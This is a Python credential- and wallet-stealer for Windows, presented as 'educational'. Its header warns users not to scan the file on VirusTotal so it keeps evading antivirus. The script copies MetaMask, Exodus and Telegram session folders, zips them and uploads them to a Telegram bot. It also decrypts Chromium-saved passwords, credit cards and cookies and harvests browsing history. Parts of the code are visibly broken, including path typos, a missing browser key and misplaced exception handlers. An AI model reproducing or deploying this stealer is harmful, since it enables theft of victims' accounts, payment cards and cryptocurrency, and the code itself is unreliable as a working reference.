######################################################################################################################################################
## Disclaimer:                                                                                                                                      ##
##                                                                                                                                                  ##
## This code includes actions that gather personal information, copy data, and send it via Telegram.                                                ##
## Ensure you have proper authorization to perform these actions, as running this script without permission could be illegal and unethical.         ##
## Always handle provided tokens and IDs securely.                                                                                                  ##
## This script is intended for educational purposes only, and I am not responsible for any illegal use of this code.                                ##
## Feel free to modify this code to enhance its capabilities responsibly.                                                                           ##
## Additionally, avoid scanning this file on virustotal.com.                                                                                        ##
## Scanning the file on virustotal.com could lead to its detection and patching by antivirus companies, diminishing its effectiveness.              ##
## Use this code responsibly and ensure you have the right to test or deploy it in your environment.                                                ##
######################################################################################################################################################

import os
import requests
import json
import base64
import sqlite3
import shutil
from   win32crypt import CryptUnprotectData
from   Cryptodome.Cipher import AES
from   datetime import datetime
import zipfile
import getpass
import pycountry
import pyautogui
import tempfile

appdata = os.getenv('LOCALAPPDATA')
user = os.path.expanduser("~")

browsers = {
    'amigo': os.path.join(appdata, 'Amigo', 'User Data'),
    'torch': os.path.join(appdata, 'Torch', 'User Data'),
    'kometa': os.path.join(appdata, 'Kometa', 'User Data'),
    'orbitum': os.path.join(appdata, 'Orbitum', 'User Data'),
    'cent-browser': os.path.join(appdata, 'CentBrowser', 'User Data'),
    '7star': os.path.join(appdata, '7star', '7star', 'User Data'),
    'sputnik': os.path.join(appdata, 'Sputnik', 'Sputnik', 'User Data'),
    'vivaldi': os.path.join(appdata, 'Vivaldi', 'User Data'),
    'google-chrome-sxs': os.path.join(appdata, 'Google', 'Chrome SxS', 'User Data'),
    'google-chrome': os.path.join(appdata, 'Google', 'Chrome', 'User Data'),
    'epic-privacy-browser': os.path.join(appdata, 'Epic Privacy Browser', 'User Data'),
    'microsoft-edge': os.path.join(appdata, 'Microsoft', 'Edge', 'User Data'),
    'uran': os.path.join(appdata, 'uCozMedia', 'Uran', 'User Data'),
    'yandex': os.path.join(appdata, 'Yandex', 'YandexBrowser', 'User Data'),
    'brave': os.path.join(appdata, 'BraveSoftware', 'Brave-Browser', 'User Data'),
    'iridium': os.path.join(appdata, 'Iridum', 'User Data'),
}

username = getpass.getuser()
ip_address = requests.get('https://api.ipfy.org').text
response = requests.get('https://ip-api.com/json/{ip_address}')
country_code = response.json().get('countryCode', '')
country = pycountry.countries.get(alpha_2=country_code)
isp = response.json().get('isp', '')

extensions_folder = os.path.join("C:\\Users", getpass.getuser(), "Appdata", "Local", "Google", "Chrome", "User Data", "Default", "Extensions")
has_metamask = 'nkbihfbeogaeaoehlefnkodbefgpgknn' in os.listdir(extensions_folder)
has_exodus = os.path.exists(os.path.join(os.getenv('APPDATA'), 'Exodus'))
has_ledger = os.path.exists(os.path.join(os.getenv('APPDATA'), 'Ledger Live'))
has_telegram = os.path.exists(os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata'))

TELEGRAM_TOKEN = ''
TELEGRAM_CHAT_ID = ''
TELEGRAM_CHAT_ID_NOTIF = ''

def send_notification_telegram(message):
    try:
        url = f'https://api.telegram.org/bot/{TELEGRAM_TOKEN}/sendMessage'
        params = {'chat_id': TELEGRAM_CHAT_ID_NOTIF, 'text': message}
        response = requests.post(url, data=params)
        if response.status_code == 200:
            print("Notification has been sent successfully via Telegram!")
        else:
            print("Failed to send the notification via Telegram!")
    except Exception as e:
        print(f"Error sending notification via Telegram: {e}")

def metamask(args, brow, count):
    try:
        if os.path.exists(args):
            shutil.copytree(args, os.path.join(user, f"AppData\\Local\\Temp\\Metamask_{brow}"))
            print(f"New Wallet found! : Total: {count}\nWallet: Metamask_{brow}")
    except shutil.Error:
        pass
    
    try:
        shutil.make_archive(os.path.join(user, f"AppData\\Local\\Temp\\Metamask_{brow}"), "zip", os.path.join(user, f"AppData\\Local\\Temp\\Metamask_{brow}"))

        zip_file_path = os.path.join(user, f"AppData\\Local\\Metamask_{brow}.zip")
        if os.path.exists(zip_file_path):
            with open(zip_file_path, "rb") as f:
                payload = {"document": (zip_file_path, f, "application/zip")}
                response = requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument",
                    files=payload,
                    data={"chat_id": TELEGRAM_CHAT_ID},
                )

                if response.status_code == 200:
                    print(f"MetaMask_{brow} archive successfully sent via Telegram.")
                else:
                    print(f"Failed to send MetaMask{brow} archive via Telegram.")
        else:
            print(f"Archive MetaMask{brow} Not Found! No data has been sent.")

        os.remove(zip_file_path)
        shutil.rmtree(os.path.join(user, f"AppData\\Local\\Temp\\Metamask_{brow}"))

    except Exception as e:
        print(f"Error handling MetaMask_{brow}: {e}")

def metamask_search():
    meta_paths = [
        [f"{user}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm", "Edge"],
        [f"{user}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn", "Edge"],
        [f"{user}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn", "Brave"],
        [f"{user}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn", "Google"],
        [f"{user}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn", "OperaGX"]
    ]

    count = 0
    try:
        for path, browser in meta_paths:
            if os.path.exists(path):
                metamask(path, browser=browser, count=count)
                count += 1
    except IndexError:
        pass

def exodus():
    if os.path.exists(os.path.join(user, "AppData\\Roaming\\Exodus")):
        try:
            shutil.copytree(os.path.join(user, "AppData\\Roaming\\Exodus"), os.path.join(user, "AppData\\Local\\Temp\\Exodus"))
            shutil.make_archive(os.path.join(user, "AppData\\Local\\Temp\\Exodus"), "zip", os.path.join(user, "AppData\\Local\\Temp\\Exodus"))

            zip_file_path = os.path.join(user, "\\AppData\\Local\\Temp\\Exodus.zip")
            if os.path.exists(zip_file_path):
                with open(zip_file_path, "rb") as f:
                    payload = {"document": (zip_file_path, f, "application/zip")}
                    response = requests.post(
                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument",
                        files=payload,
                        data={"chat_id": TELEGRAM_CHAT_ID},
                    )

                    if response.status_code == 200:
                        print("Archive Exodus evoyee avec success via Telegram.")
                    else:
                        print("Echec de I envoi de 1 archive Exodus via Telegram.")
            else:
                print("Archive Exodus introuvable. Aucune donnee n'a ete envoyee.")

                try:
                    os.remove(zip_file_path)
                    shutil.rmtree(os.path.join(user, "AppData\\Local\\Temp\\Exodus"))
                except Exception as e:
                    print(f"Erreur lors de la gestion de 1 archive Exodus temporaire : {e}")

                except Exception as e:
                    print(f"Erreur lors de la gestion du dossier Exodus : {e}")

        except Exception as e:
            print(f"Error with Exodus: {e}")

def telegram():
    if os.path.exists(os.path.join(user, "AppData\\Roaming\\Telegram Desktop\\tdata")):
        try:
            tdata_dir = os.path.join(user, "AppData\\Romaing\\Telegram Desktop\\tdata")
            user_data_dirs = [f for f in os.listdir(tdata_dir) if os.path.isdir(os.path.join(tdata_dir, f)) and f.startswith("user_data")]

            ignore_items = shutil.ignore_patterns(*user_data_dirs, "emoji", "working")

            with tempfile.TemporaryDirectory() as temp_dir:
                shutil.copytree(
                    tdata_dir,
                    os.path.join(temp_dir, "tdata_session"),
                    ignore=ignore_items,
                )

                zip_file_path = os.path.join(temp_dir, "tdata_session.zip")
                shutil.make_archive(
                        os.path.join(temp_dir, "tdata_session"),
                        "zip",
                        os.path.join(temp_dir, "tdata_session"),
                    )
                
                if os.path.exists(zip_file_path):
                    with open(zip_file_path, "rb") as f:
                        payload = {"document": (zip_file_path, f, "application/zip")}
                        response = requests.post(
                            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument",
                            files=payload,
                            data={"chat_id": TELEGRAM_CHAT_ID},
                        )

                        if response.status_code == 200:
                            print("Donnees de sesssion Telegram envoyees avec success.")

                            os.remove(zip_file_path)
                        else:
                            print("Echec de 1'envoi des donnees de session Telegram.")
                else:
                    print("Archive des donnees de session Telegram introuvable. Aucune donnee n'a ete envoyee.")

        except PermissionError as e:
            print(f"Error copying Telegram session data: {e}")
            print(f"Continuing to send remaining data via Telegram.")

        except Exception as e:
            print(f"Error copying or sending Telegram session data: {e}")

def get_master_key(path: str):
    if not os.path.exists(path):
        return
    
    if 'os_crypt' not in open(os.path.join(path, "Local State"), 'r', encoding='utf-8').read():
        return
    
    with open(os.path.join(path, "Local State"), "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key


def decrypt_password(buff: bytes, master_key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypt_pass = cipher.decrypt(payload)
    decrypt_pass = decrypt_pass[:-16].decode()

    return decrypt_pass


def installed_browsers():
    results = []
    for browser, path in browsers.items():
        if os.path.exists(path):
            results.append(browser)
    return results


def get_login_data(path: str, profile: str, master_key):
    login_db = os.path.join(path, profile, 'Login Data')
    if not os.path.exists(login_db):
        return
    result = ""
    shutil.copy(login_db, os.path.join(user, 'AppData', 'Local', 'Temp', 'login_db'))
    conn = sqlite3.connect(os.path.join(user, 'AppData', 'Local', 'Temp', 'login_db'))
    cursor = conn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    for row in cursor.fetchall():
        password = decrypt_password(row[2], master_key)
        result += f"""
        URL: {row[0]}
        Email: {row[1]}
        Password: {password}

        """
    conn.close()
    os.remove(os.path.join(user, 'AppData', 'Local', 'Temp', 'login_db'))
    return result


def get_credit_cards(path: str, profile: str, master_key):
    cards_db = os.path.join(path, profile, 'Web Data')
    if not os.path.exists(cards_db):
        return
    
    result = ""
    shutil.copy(cards_db, os.path.join(user, 'AppData', 'Local', 'Temp', 'card_db'))
    conn = sqlite3.connect(os.path.join(user, 'AppData', 'Local', 'Temp', 'card_db'))
    cursor = conn.cursor()
    cursor.execute(
        'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2] or not row[3]:
            continue

        card_number = decrypt_password(row[3], master_key)
        result += f"""
        Name Card: {row[0]}
        Card Number: {card_number}
        Expires: {row[1]} / {row[2]}
        Added: {datetime.fromtimestamp(row[4])}

    """
        
        conn.close()
        os.remove(os.path.join(user, 'AppData', 'Local', 'Temp', 'cards_db'))
        return result
    

def get_cookies(path: str, profile: str, master_key):
    cookie_db = os.path.join(path, profile, 'Network', 'Cookies')
    if not os.path.exists(cookie_db):
        return
    result = ""
    shutil.copy(cookie_db, os.path.join(user, 'AppData', 'Local', 'Temp', 'cookie_db'))
    conn = sqlite3.connect(os.path.join(user, 'AppData', 'Local', 'Temp', 'cookie_db'))
    cursor = conn.cursor()
    cursor.execute('SELECT host+key, name, path, encrypted_value, expires_utc FROM cookies')
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2] or not row[3]:
            continue

        cookie = decrypt_password(row[3], master_key)

        result += f"""
        Host Key : {row[0]}
        Cookie Name : {row[1]}
        Path: {row[2]}
        Cookie: {cookie}
        Expires On: {row[4]}

        """

        conn.close()
        os.remove(os.path.join(user, 'AppData', 'Local', 'Temp', 'cookie_db'))
        return result
    

def get_web_history(path: str, profile: str):
    web_history_db = os.path.join(path, profile, 'History')
    result = ""
    if not os.path.exists(web_history_db):
        return result
    
    shutil.copy(web_history_db, os.path.join(os.getenv('LOCALAPPDATA'), 'Temp', 'web_history_db'))
    conn = sqlite3.connect(os.path.join(os.getenv('LOCALAPPDATA'), 'Temp', 'web_history_db'))
    cursor = conn.cursor()
    cursor.execute('SELECT url, title, last_visit_time FROM urls')
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2]:
            continue
        result += f"""
        URL: {row[0]}
        Title: {row[1]}
        Visited Time: {row[2]}

        """
    conn.close()
    os.remove(os.path.join(os.getenv('LOCALAPPDATA'), 'Temp', 'web_history_db'))
    return result


def get_downloads(path: str, profile: str):
    downloads_folder = os.path.join(path, profile, 'History')
    if not os.path.exists(downloads_folder):
        return
    result = ""
    downloads = os.listdir(downloads_folder)
    for download in downloads:
        result += f"File: {download}\n"
    return result


def main():
    try:
        metamask_search()
    except Exception as e:
        print(f"Error with MetaMask search: {e}")

    try:
        exodus()
    except Exception as e:
        print(f"Error with Exodus: {e}")

    try:
        telegram()
    except Exception as e:
        print(f"Error with Telegram: {e}")

    try:
        master_key = get_master_key(browsers["chrome"])
        if master_key:
            for browser in installed_browsers():
                try:
                    data = get_login_data(browsers[browser], 'Default', master_key)
                    if data:
                        print(f"{browser} login data:\n{data}")
                except Exception as e:
                    print(f"Error with {browser} login data: {e}")

                try:
                    data = get_credit_cards(browsers[browser], 'Default', master_key)
                    if data:
                        print(f"{browser} credit card data:\n{data}")
                except Exception as e:
                    print(f"Error with {browser} credit card data: {e}")

                try:
                    data = get_cookies(browsers[browser], 'Default', master_key)
                    if data:
                        print(f"{browser} cookie data:\n{data}")
                except Exception as e:
                    print(f"Error with {browser} cookie data: {e}")

                try:
                    data = get_web_history(browsers[browser], 'Default')
                    if data:
                        print(f"{browser} web history data:\n{data}")
                except Exception as e:
                    print(f"Error with {browser} web history data: {e}")

                try:
                    data = get_downloads(browsers[browser], 'Default')
                    if data:
                        print(f"{browser} download data:\n{data}")
                except Exception as e:
                    print(f"Error with {browser} download data: {e}")

    except Exception as e:
        print(f"Error retrieving browser data: {e}")

    try:
        send_notification_telegram("All data has been collected successfully.")
    except Exception as e:
        print(f"Error sending final notification via Telegram: {e}")


if __name__ == '__main__':
    main()
